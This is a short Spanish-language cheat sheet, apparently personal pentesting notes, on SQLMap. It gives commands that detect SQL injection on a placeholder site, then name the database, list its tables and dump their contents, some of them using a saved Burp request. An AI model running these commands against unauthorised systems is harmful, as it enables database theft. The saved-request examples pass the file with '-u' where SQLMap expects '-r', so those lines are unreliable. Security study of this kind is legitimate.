
---
Herramienta: ⚡ SQLMap
Comando: sqlmap
Categoría: Automatización de SQL Injection
SO: Multiplataforma
tags:
  - sql_injection
  - bases_de_datos
  - hacking
  - testing
  - herramienta
---

## SQLMap

### Descripción

**SQLMap** es una herramienta automatizada de prueba de penetración que identifica y explota vulnerabilidades de inyección SQL en aplicaciones web. Permite a los usuarios interactuar con bases de datos vulnerables para realizar tareas como la enumeración de tablas, extracción de datos, obtención de credenciales e incluso la ejecución de comandos en sistemas comprometidos.

---

### Modificación de parámetros del payload en SQLMap

SQLMap genera automáticamente payloads para explotar vulnerabilidades de inyección SQL, pero es posible personalizar los parámetros para explorar diferentes bases de datos o realizar ataques más específicos.

---

### Uso básico de SQLMap

1. **Detección de vulnerabilidades**:
   Ejecuta SQLMap contra un objetivo para detectar posibles inyecciones SQL:
```bash
   sqlmap -u "http://objetivo.com/product?id=1" --batch
```

Tambien se puede hacer mediante un http request que hayamos guardado (desde burpsuite) y funciona incluso mejor. Un ejemplo sería:

```bash
#Asegurarse de estar en el mismo direcotorio que el request.
sqlmap -u request -p parametro_injectable --technique tecnica_explotacion
```

Mas ejemplos:

```bash
#Pillar le nombre de la base de datos
sqlmap -u request -p parametro_injectable --technique tecnica_explotacion --current-db

# Pillar las tablas de la base de datos
sqlmap -u request -p parametro_injectable --technique tecnica_explotacion -D nombre_database --tables

#Coger valores de una tabla
sqlmap -u request -p parametro_injectable --technique tecnica_explotacion -D nombre_database -T tabla --dump
```